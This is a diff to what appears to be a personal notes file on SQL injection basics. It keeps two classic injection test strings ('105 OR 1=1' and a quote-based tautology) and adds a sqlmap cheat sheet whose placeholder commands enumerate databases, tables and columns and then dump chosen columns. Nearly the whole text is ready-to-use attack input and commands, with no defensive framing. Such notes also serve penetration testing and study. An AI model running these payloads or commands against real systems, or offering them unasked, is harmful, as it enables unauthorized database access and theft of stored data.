@@ -29,3 +29,12 @@ SQLInjection Basic Stuff
 105 OR 1=1
 " or ""="
 ```
+Sqlmap quick cheat sheet
+-------------
+```
+sqlmap -u ${url}
+sqlmap -u ${url} --dbs
+sqlmap -u ${url} -D ${database} --tables
+sqlmap -u ${url} -D ${database} -T ${table} --columns
+sqlmap -u ${url} -D ${database} -T ${table} -C ${col1},${col2} --dump
+```
